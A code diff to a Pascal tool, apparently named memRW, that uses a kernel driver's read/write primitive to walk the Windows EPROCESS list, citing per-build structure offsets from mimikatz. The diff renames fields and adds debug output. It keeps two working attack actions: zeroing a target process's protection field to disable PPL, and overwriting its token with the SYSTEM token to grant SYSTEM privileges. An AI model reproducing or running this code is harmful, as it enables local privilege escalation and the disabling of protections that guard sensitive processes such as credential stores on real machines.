@@ -5,7 +5,7 @@ program memRW;
 uses windows,sysutils, udrv, urtcore, untdll;
 
 type toffsets=record
-      EprocessNext:word;
+      nextFlink:word; //aka activeprocesslinks
       Token:word;
       SignatureProtect:word;
       ImageFileName:word;
@@ -89,10 +89,11 @@ device:thandle=thandle(-1);
          UniqueProcessId:dword64=0;
          SystemProcessFlink:dword64=0;
          value:dword64=0;
-         next:dword64=0;
+         nextFlink:dword64=0;
          imagefilename:string='';
          protection:dword=0;
          SystemProcessToken:dword64=0;
+         EProcessAddr:dword64=0;
          CurrentProcessFastToken,CurrentProcessTokenReferenceCounter,CurrentProcessToken:dword64;
 begin
 //open handle
@@ -109,32 +110,32 @@ WriteLn ('KernelBaseAddr:'+inttohex(NtoskrnlBaseAddress,sizeof(nativeuint)));
     WriteLn('PsInitialSystemProcessAddress:'+inttohex(PsInitialSystemProcessAddress,sizeof(nativeuint)));
     //https://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/eprocess/index.htm
     //offsets : https://github.com/gentilkiwi/mimikatz/blob/68ac65b426d1b9e1354dd0365676b1ead15022de/mimidrv/kkll_m_process.c#L8
-    //should be 00000004
-    UniqueProcessId := ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.EprocessNext-8);
+    UniqueProcessId := ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.nextFlink-8);
     imagefilename:=ReadMemory16bytes(Device, PsInitialSystemProcessAddress + offsets.ImageFileName);
+    WriteLn('UniqueProcessId:'+inttohex(UniqueProcessId,sizeof(nativeuint))+';'+imagefilename);
     //clear low 4 bits of _EX_FAST_REF structure
     SystemProcessToken := ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.Token) and not 15;
-    WriteLn('UniqueProcessId:'+inttohex(UniqueProcessId,sizeof(nativeuint))+';'+imagefilename);
-    SystemProcessFlink:= ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.EprocessNext);
+    SystemProcessFlink:= ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.nextFlink);
     //WriteLn('SystemProcessFlink:'+inttohex(SystemProcessFlink,sizeof(nativeuint)));
     writeln('*************************');
-    next:=SystemProcessFlink;  //first LIST_ENTRY
+    nextFlink:=SystemProcessFlink;  //first LIST_ENTRY
     if UniqueProcessId=4 then //safety check
     begin
+    //follow the rabbit : lets look at the next eprocess by following list_entry links
+    writeln('EProcess;UniqueID;ImageFilename');
     while value<>SystemProcessFlink do
     begin
-          UniqueProcessId:=ReadMemoryDWORD64(Device, next-8);
-          imagefilename:=ReadMemory16bytes(Device, next-offsets.EprocessNext+offsets.ImageFileName);
-          protection :=ReadMemoryDword(Device, next-dword64(offsets.EprocessNext)+dword64(offsets.SignatureProtect));
+          EProcessAddr:=nextFlink-dword64(offsets.nextFlink);
+          UniqueProcessId:=ReadMemoryDWORD64(Device, EProcessAddr+offsets.nextFlink-8);
+          imagefilename:=ReadMemory16bytes(Device, EProcessAddr+offsets.ImageFileName);
+          protection :=ReadMemoryDword(Device, EProcessAddr+dword64(offsets.SignatureProtect));
           if (UniqueProcessId<4) or (UniqueProcessId>$FFFF) then break;
 
           if action=0
-             then writeln(inttohex(next-offsets.EprocessNext,sizeof(nativeuint))+';'+inttostr(UniqueProcessId)+';'+imagefilename+';'+inttohex(protection,sizeof(dword)) );
-
-          //WriteLn('flags :'+inttohex(ReadMemorydword(Device, next-$2E8+$300),4));
-          //WriteLn('flags2 :'+inttohex(ReadMemorydword(Device, next-$2E8+$304),4));
-          //WriteLn('flags3 :'+inttohex(ReadMemorydword(Device, next-$2E8+$6CC),4));
-
+             then writeln(inttohex(EProcessAddr,sizeof(nativeuint))+';'+inttostr(UniqueProcessId)+';'+imagefilename+';'+inttohex(protection,sizeof(dword)) );
+          //writeln(ReadMemoryDword64(Device, EProcessAddr+$640)); //ExitTime if <>0 then terminated
+          writeln('DirectoryTableBase:'+inttohex(ReadMemoryDword64(Device, EProcessAddr+$28),sizeof(dword64)));//DirectoryTableBase $28 aka CR3 - is the root of the Page Tables in physical memory
+          writeln('SectionBaseAddress:'+inttohex(ReadMemoryDword64(Device, EProcessAddr+$3b0),sizeof(dword64)));//SectionBaseAddress $3b0
           //writeln('*************************');
 
           if UniqueProcessId=targetpid then
@@ -142,7 +143,7 @@ WriteLn ('KernelBaseAddr:'+inttohex(NtoskrnlBaseAddress,sizeof(nativeuint)));
              if (action=1) and (offsets.SignatureProtect<>0) then
                 begin
                 writeln('patching process protection:'+inttostr(UniqueProcessId ));
-                if WriteMemoryPrimitive (device,4,next-dword64(offsets.EprocessNext)+dword64(offsets.SignatureProtect),0)=false  //disable PPL
+                if WriteMemoryPrimitive (device,4,EProcessAddr+dword64(offsets.SignatureProtect),0)=false  //disable PPL
                                         then writeln('WriteMemoryPrimitive failed');
                 //WriteMemoryPrimitive (device,4,next-offsets.EprocessNext+offsets.SignatureProtect,$00623F3F); //enable PPL
                 end;
@@ -151,17 +152,17 @@ WriteLn ('KernelBaseAddr:'+inttohex(NtoskrnlBaseAddress,sizeof(nativeuint)));
              if (action=2) and (offsets.Token<>0) then
                 begin
                 writeln('make system');
-                CurrentProcessFastToken := ReadMemoryDWORD64(Device, next-offsets.EprocessNext+ offsets.Token);
+                CurrentProcessFastToken := ReadMemoryDWORD64(Device, EProcessAddr+ offsets.Token);
                 CurrentProcessTokenReferenceCounter := CurrentProcessFastToken and 15;
                 CurrentProcessToken := CurrentProcessFastToken and not 15;
-                WriteMemoryDWORD64(Device, next-offsets.EprocessNext+ offsets.Token, CurrentProcessTokenReferenceCounter or SystemProcessToken);
+                WriteMemoryDWORD64(Device, EProcessAddr+ dword64(offsets.Token), CurrentProcessTokenReferenceCounter or SystemProcessToken);
                 end;
 
              break;
              end;
 
-          next:=ReadMemoryDWORD64(Device, next);
-          value:=next;
+          nextFlink:=ReadMemoryDWORD64(Device, nextFlink);
+          value:=nextFlink;
 
     end; //while value<>ActiveProcessLinks do
 
@@ -194,18 +195,18 @@ begin
  begin
  fillchar(offsets,sizeof(offsets),0);
  case strtoint(releaseid) of
- 7600:begin    EprocessNext :=$0188;SignatureProtect :=$000; Token :=$208;ImageFileName :=$2e0; end; //7
- 7601:begin    EprocessNext :=$0188;SignatureProtect :=$000; Token :=$208;ImageFileName :=$2e0; end; //7sp1
- 9200:begin    EprocessNext :=$02e8;SignatureProtect :=$0648; Token :=$348;ImageFileName :=$438; end; //8.0
- 9600:begin    EprocessNext :=$02e8;SignatureProtect :=$0678; Token :=$348;ImageFileName :=$438; end; //8.1
+ 7600:begin    nextFlink :=$0188;SignatureProtect :=$000; Token :=$208;ImageFileName :=$2e0; end; //7
+ 7601:begin    nextFlink :=$0188;SignatureProtect :=$000; Token :=$208;ImageFileName :=$2e0; end; //7sp1
+ 9200:begin    nextFlink :=$02e8;SignatureProtect :=$0648; Token :=$348;ImageFileName :=$438; end; //8.0
+ 9600:begin    nextFlink :=$02e8;SignatureProtect :=$0678; Token :=$348;ImageFileName :=$438; end; //8.1
  //
- 1703:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358;ImageFileName :=$450; end;
- 1709:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; ImageFileName :=$450; end;
- 1803:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; ImageFileName :=$450; end;
- 1809:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; ImageFileName :=$450; end;
- 1903:begin    EprocessNext :=$02f0;SignatureProtect :=$06f8; Token :=$360; ImageFileName :=$450; end;
- 1909:begin    EprocessNext :=$02f0;SignatureProtect :=$06f8; Token :=$360; ImageFileName :=$450; end;
- 2004:begin    EprocessNext :=$0448;SignatureProtect :=$0878; Token :=$4b8; ImageFileName :=$5a8; end;
+ 1703:begin    nextFlink :=$02e8;SignatureProtect :=$06c8; Token :=$358;ImageFileName :=$450; end;
+ 1709:begin    nextFlink :=$02e8;SignatureProtect :=$06c8; Token :=$358; ImageFileName :=$450; end;
+ 1803:begin    nextFlink :=$02e8;SignatureProtect :=$06c8; Token :=$358; ImageFileName :=$450; end;
+ 1809:begin    nextFlink :=$02e8;SignatureProtect :=$06c8; Token :=$358; ImageFileName :=$450; end;
+ 1903:begin    nextFlink :=$02f0;SignatureProtect :=$06f8; Token :=$360; ImageFileName :=$450; end;
+ 1909:begin    nextFlink :=$02f0;SignatureProtect :=$06f8; Token :=$360; ImageFileName :=$450; end;
+ 2004:begin    nextFlink :=$0448;SignatureProtect :=$0878; Token :=$4b8; ImageFileName :=$5a8; end;
  //20H2:begin    EprocessNext :=$0448;SignatureProtect :=$0878; Token :=$4b8; end;
  //21H1:begin    EprocessNext :=$0448;SignatureProtect :=$0878; Token :=$4b8; end;
  else result:=false;
@@ -217,12 +218,13 @@ end;
 begin
 if paramcount=0 then exit;
 //
+//or use RtlGetVersion
 ReleaseID:=ReadRegEntry ('SOFTWARE\Microsoft\Windows NT\CurrentVersion','ReleaseID' );
 if ReleaseID ='' then ReleaseID :=ReadRegEntry ('SOFTWARE\Microsoft\Windows NT\CurrentVersion','CurrentBuildNumber' );
 if ReleaseID ='' then begin writeln('No ReleaseID');exit;end;
 writeln('ReleaseID:'+releaseid);
 if SetOffsets =false then begin writeln('Offsets unknown');exit; end;
-writeln('EprocessNext:'+inttohex(offsets.EprocessNext,sizeof(offsets.EprocessNext)));
+writeln('ActiveProcessLinks:'+inttohex(offsets.nextFlink,sizeof(offsets.nextFlink)));
 writeln('SignatureProtect:'+inttohex(offsets.SignatureProtect,sizeof(offsets.SignatureProtect)));
 writeln('Token:'+inttohex(offsets.Token ,sizeof(offsets.Token)));
 writeln('ImageFileName:'+inttohex(offsets.ImageFileName,sizeof(offsets.ImageFileName)));
